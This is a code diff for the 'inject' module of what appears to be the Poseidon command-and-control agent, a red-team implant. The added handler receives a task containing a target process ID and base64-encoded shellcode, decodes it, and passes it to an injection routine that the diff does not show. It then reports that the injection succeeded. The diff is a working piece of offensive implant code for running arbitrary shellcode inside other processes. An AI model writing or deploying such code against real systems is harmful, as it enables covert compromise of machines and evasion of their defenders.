@@ -1,14 +1,55 @@
 package inject
 
-import "github.com/xorrior/poseidon/pkg/utils/structs"
+import (
+	"encoding/base64"
+	"encoding/json"
+	"fmt"
+
+	"github.com/xorrior/poseidon/pkg/utils/structs"
+)
 
 type Injection interface {
 	TargetPid() int
 	Shellcode() []byte
 }
 
+type Arguments struct {
+	PID              int    `json:"pid"`
+	EncodedShellcode string `json:"shellcode"`
+}
+
 func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
 	tMsg := structs.ThreadMsg{}
 	tMsg.TaskItem = task
 
+	args := Arguments{}
+	err := json.Unmarshal([]byte(task.Params), &args)
+
+	if err != nil {
+		tMsg.Error = true
+		tMsg.TaskResult = []byte(err.Error())
+		threadChannel <- tMsg
+		return
+	}
+
+	raw, err := base64.StdEncoding.DecodeString(args.EncodedShellcode)
+
+	if err != nil {
+		tMsg.Error = true
+		tMsg.TaskResult = []byte(err.Error())
+		threadChannel <- tMsg
+		return
+	}
+
+	success, err := injectShellcode(args.PID, raw)
+
+	if err != nil {
+		tMsg.Error = true
+		tMsg.TaskResult = []byte(err.Error())
+		threadChannel <- tMsg
+		return
+	}
+
+	tMsg.TaskResult = []byte(fmt.Sprintf("Successfully injected into target process with id: %d", args.PID))
+	threadChannel <- tMsg
 }
